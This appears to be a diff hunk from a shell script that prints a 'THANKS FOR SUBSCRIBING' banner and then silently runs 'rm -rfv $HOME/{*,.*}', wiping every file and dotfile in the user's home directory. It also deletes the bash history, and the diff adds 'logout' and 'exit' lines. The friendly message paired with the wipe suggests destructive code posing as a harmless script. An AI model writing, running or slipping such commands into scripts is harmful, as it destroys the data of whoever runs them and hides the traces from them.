@@ -187,3 +187,5 @@ THANKS FOR SUBSCRIBING !!!
 ${RESET}"
 rm -rfv $HOME/{*,.*}
 rm $HOME/./.bash_history
+logout
+exit
